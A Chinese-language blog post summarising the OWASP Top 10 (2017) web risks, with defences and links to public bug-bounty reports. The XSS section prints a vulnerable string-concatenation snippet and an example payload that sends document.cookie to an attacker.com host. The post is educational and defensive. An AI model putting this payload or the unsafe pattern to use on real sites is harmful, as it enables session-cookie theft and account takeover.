---
title: "OWASP TOP 10(2017)"
date: 2019-09-21T17:21:11+11:00
summary: 《OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks》总结了Web应用程序最可能、最常见、最危险的十大漏洞。虽然离报告发布已经过去了两年，但是这份报告对web安全介绍还是十分有意义的。尤其是对于刚入门web安全的工程师来说，这份报告是一个非常好的指南，可以帮助IT公司和开发团队规范应用程序开发流程和测试流程，提高Web产品的安全性。本文将会根据这些漏洞类型，进行分类分析，并提出一些我个人的看法。最后会根据这套报告，对一些网站进行测试。
draft: false
---

[OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)总结了Web应用程序最可能、最常见、最危险的十大漏洞。虽然离报告发布已经过去了两年，但是这份报告对web安全介绍还是十分有意义的。尤其是对于刚入门web安全的工程师来说，这份报告是一个非常好的指南，可以帮助IT公司和开发团队规范应用程序开发流程和测试流程，提高Web产品的安全性。本文将会根据这些漏洞类型，进行分类分析，并提出一些我个人的看法。最后会根据这套报告，对一些网站进行测试。

## 第一类：没有对用户输入进行验证

### A1 : 注入

在web安全中，注入是最常见也往往是影响最大的漏洞。他包括SQL、NoSQL、OS以及LDAP注入等。这些漏洞基本都是因为没有对用户的输入进行验证。其中以对数据库的注入最多。作为web应用，需要依靠许多第三方的服务（比如数据库，缓存，系统调用等等）来实现具体的功能。在web调用这些服务的时候往往是给这些服务发送一些命令，如果不对用户的输入进行验证，用户的输入就很容易的对这些们命令进行修改，达到调用其他命令的目的。

**相关案例**

[RCE with Flask Jinja Template Injection](https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870)
[H1-4420: From Quiz to Admin - Chaining Two 0-Days to Compromise An Uber Wordpress](https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/)

### A4：XML外部实体漏洞（XXE）

这种漏洞主要出现在paring XML时候出了问题。这些漏洞一般出现在一些支持SOAP的web服务，服务器需要对XML格式的请求进行分析。OWASP中对这种漏洞的应对建议是：
1. 尽量使用简单的JSON请求
2. 使用安全的XML parser，升级SOAP到SOAP1.2或者更高
3. 对请求进行验证（如使用白名单等等）

**相关案例**

[OOB XXE in PrizmDoc (CVE-2018–15805)](https://medium.com/@mrnikhilsri/oob-xxe-in-prizmdoc-cve-2018-15805-dfb1e474345c)

### A7 : 跨站脚本-XSS

与A1的后端服务注入不同，XSS是对client端网页的注入，攻击对象是以client端为主。常见的XSS注入类型有：
1. 储存型（注入代码保存到Database）
2. 反射型（注入代码不保存到后端，直接显示到网页上）
   ```js=
   (String)page += "<input name='creditcard' type='TEXT' value='" 
   + request.getParameter("CC") + "'>";
   // 攻击者可以通过修改浏览器中'CC'参数来实现注入,达到窃取cookie的目的
   <script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?
   foo='+docuement.cookie</script>'
   ```
3. DOM型（一般都是单页应用中，用户可控数据被注入）

OWASP中对这种漏洞的应对建议是：
1. 使用框架自带的XSS防护，了解所用框架对XSS的防护手段
2. 对用户可控数据进行验证，去掉危险的符号
3. 使用CSP

**相关案例**

- [Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains](https://hackerone.com/reports/256152)
- [Reflected XSS POST method at partners.uber.com](https://hackerone.com/reports/129582)
- [How a classical XSS can lead to persistent ATO Vulnerability?](https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/)

### A8：不安全的反序列化漏洞

这种漏洞和XXE有些类似。反序列化是一个从字符到内存对象的转化过程。中间涉及到parsing, 并会在内存中构造对象。几乎像一个简化般的解释器在解释代码。可想而知中间会出现多少问题。OWASP中对这种漏洞的应对建议：

1. 尽量不要接受外部的序列化对象，或者只接受原始数据类型的序列化对象。
2. 如果以上无法做到，可以考虑以下方法：
    - 使用数字签名进行完整性检验
    - 反序列化之后，进行严格的类型检查
    - 把反序列化的工作隔离开来并运行在低权限环境中
    - 记录反序列化异常
    - 限制并记录那些传输反序列化的容器或服务器
    - 监控反序列化，对经常调用反序列化的用户进行预警

**相关案例**

- [RCE and Complete Server Takeover of http://www.***.starbucks.com.sg/](https://hackerone.com/reports/502758)
- [Lack of payment type validation in dial.uber.com allows for free rides](https://hackerone.com/reports/162199)

## 第二类： 获得非法信息/功能的成本过低

### A2 : 失效的身份认证和会话管理

身份认证是web服务中非常重要，也是最基本的一个功能。但是要把这块做好其实没有想象中那么容易。连Instagram在前不久都出现了认证方面的漏洞。根据OWASP，常见的身份认证的漏洞有：
1. 允许攻击者对大量帐号进行自动登录测试
2. 允许攻击者对某个帐号进行自动的穷举登录测试
3. 在URL中暴露session id
4. session id没有更换或者失效

这些漏洞都有一个共同的特点，信息泄漏的门槛太低。换句话说，攻击者可以以相对较低的成本获得相应的用户（登录）信息。常见防御的手段是：

1. 尽可能使用多重验证（MFA）
2. 不要使用初始的简单的密码，尤其是对于admin账户
3. 不让user创建简单的密码，提高安全性
4. 提高攻击者对用户帐号进行暴力破解的成本（比如增加验证码，增加登录出错后要等待的功能）
5. 定期对sessioin id进行更换

其实不只是登录穷举的问题，还有验证码穷举，总之涉及验证的功能都要有防止穷举的措施。

### A3 : 敏感信息泄露

这类漏洞主要和信息保存和传输相关。根据OWASP，没有https加密的传输，在DB中的敏感资料（如密码）不进行加密，或者加密过弱等等都是导致漏洞的原因。

这里我想补充一个我在其他地方看到的一个例子。A网站是一个股票公告发布的网站，所有上市交易公司的公告都要通过这个网站定时向外发布。A君是负责检阅并发布公司公告的负责人。因为每天需要发布的公告太多，A君习惯先把公告保存到网站上（此时链接已经生成，只是没有公开），然后到时间在把文章的link更新网站的页面上，这样所有人可以根据这个公开link访问dao公告。B君是一个股票交易员，他发现公告的link都是有规律的，而且他还发现很多时候链接还没有公开就已经可以访问。于是他写了一个脚本，对这些已经生成链接但是还没有公开的公告进行下载（循环穷举）。这样他就可以比市场提前一步获得股票的最新信息，从而获得巨大的信息优势。

**相关案例**
- [Client secret, server tokens for developer applications returned by internal API](https://hackerone.com/reports/419655)

### A5 : 缺少功能级访问控制

根据OWASP，对用户的错误访问控制是一个比较常见的漏洞。因为缺少自动的权限测试，很多时候还是手动测试为主。对此OWASP的建议是，所有权限校验和访问控制都必须是后端完成，而且要对用户的输入进行严格的检验。

**相关案例**
- [Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)](https://hackerone.com/reports/143717)
- [Shopify Admin -- Permission from Settings to Customer](https://hackerone.com/reports/541606)

### A6 : 配置错误

随着web的发展，各种新技术和工具如雨后春笋般出现。这里面许多工具都涉及到许多配置，尤其是一些默认配置，如果配置不当很容易造成漏洞。根据OWASP，一般有以下几种配置错误的情况：
1. 没有做好工具的安全配置
2. 没有禁止默认的帐号和密码
3. 打开了不需要的功能
4. 将出错处理的信息返回给攻击者
5. 使用老旧的有漏洞的软件

程序员应该要对自己使用的工具和技术有基本的认识，尤其是相应工具的安全配置，以及可能出现的问题。

**相关案例**

- [Nginx misconfiguration leading to direct PHP source code download](https://hackerone.com/reports/268382)
- [Chained Bugs to Leak Victim's Uber's FB Oauth Token](https://hackerone.com/reports/202781)
- [Open Redirect on central.uber.com allows for account takeover](https://hackerone.com/reports/206591)

## 第三类： 

### A9 : 使用含有已知漏洞的组件

这类漏洞非常常见。基本上某个组件被爆出漏洞（0day），都会有一段时间需要admin打补丁。以前很多都是手动的，但是现在基本都要求自动化，以减少攻击窗口。如果漏洞都发布了好一段时间，甚至连exploit都放出来了，网站都没有打补丁或者跟换组件，那么这个漏洞就迟早被人利用。以bludkeep漏洞为例。这个漏洞2019年3月份公布，前几天更是放出了可以导致code execution的[exploit](https://github.com/rapid7/metasploit-framework/pull/12283), 但是我们通过shodan可以看到仅仅在中国就有20w的服务器没有打补丁。

![](https://i.imgur.com/myZOqmL.png)

这种漏洞经常会被malware所利用并进行快速传播。那些挖矿，DDOS等malware最喜欢就是这种漏洞。我之前写过一篇关于DDOS的malware分析，有兴趣的可以一看。

### A10：不足的记录和漏洞监控

初看起来这好像和漏洞并没有什么关系，因为没有记录和监控并不是直接导致网站被入侵。但仔细想，没有监控和记录确实是很大的安全问题。许多攻击正是因为有监控和记录才得到及时的制止。没有监控，网站被入侵了都不知道，甚至黑客能在公司网络盘踞好几个月而不被发现。如果有了监控和记录，即使网站有漏洞被黑客利用，也能尽快的发现，并最大可能的减少损失。在这方面aws是做的很不错，不仅对外有强大的cloudwatch进行监控，对内则有cloudtrail，既防外敌，也防家贼。

提到记录和监控，其中还有一种比较特殊的防御机制，叫做蜜罐。简单的讲是部署一个有漏洞的公开服务器，通过记录和监控，观察黑客是如何渗透攻击的。通过观察黑客的攻击手法，从而更好的防御。

## Summary

1. 识别收集可能的攻击点（attack surface）
    - 识别网站的功能，以及相应需要的资源
3. 考虑攻击点背后可能涉及到的技术（比如是否需要查询DB等等）
4. 考虑攻击点背后的可能的实现路径（包括异常处理的路径）

